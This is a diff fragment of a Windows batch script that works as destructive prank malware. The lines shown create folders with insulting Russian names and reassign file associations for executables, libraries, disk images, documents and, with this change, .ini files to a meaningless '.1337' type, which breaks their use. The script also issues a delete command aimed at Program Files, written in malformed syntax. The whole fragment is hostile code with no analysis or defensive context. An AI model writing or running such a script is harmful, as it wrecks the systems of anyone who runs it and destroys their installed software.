@@ -7,6 +7,7 @@ md LUZER
 md DURAK
 md LAMER
 md DIBIL
+md LOH
 assoc .exe=.1337
 assoc .iso=.1337
 assoc .dat=.1337
@@ -15,5 +16,5 @@ assoc .dll=.1337
 assoc .docx=.1337
 assoc .mbr=.1337
 assoc .bin=.1337
+assoc .ini=.1337
 del c:Program Files/q
-tree
